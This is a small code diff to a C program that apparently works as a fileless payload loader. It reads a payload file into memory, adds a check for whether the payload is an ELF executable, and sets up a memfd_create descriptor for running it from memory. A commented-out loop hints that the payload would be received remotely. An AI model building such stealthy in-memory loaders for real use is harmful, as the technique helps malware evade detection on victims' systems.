@@ -28,9 +28,10 @@ int main(int argc, char **argv){
     int size; // to hold file size, remove in final deliverable
     int payload_fd; // in memory file descriptor
     int write_return_size;
-    const char * payload_argv[] = {"test_ELF", "testing", NULL}; // argv for payload
+    int d; //to hold the return value of detect()
+    const char * payload_argv[] = {"./test_files/test_ELF", "testing", NULL}; // argv for payload
     const char * payload_envp[] = {NULL}; // envp for payload
-    
+     
 /*
     while(receive(payload) != 0){
         puts("BAD SHIT YO");
@@ -47,6 +48,8 @@ int main(int argc, char **argv){
     payload = calloc(size, sizeof(unsigned char)); // allocate on heap
     fread(payload, sizeof(unsigned char), size, payload_file); // read file to heap
     fclose(payload_file); //close file
+
+    d = detect((unsigned char *)payload); //determine if the payload is an executable/ELF
 
     // TODO: Recreate payload_fd if invalid (has returned STDIN, STDOUT, and STDERR before)
     payload_fd = memfd_create("payload", 0); // create memory file descriptor for execution
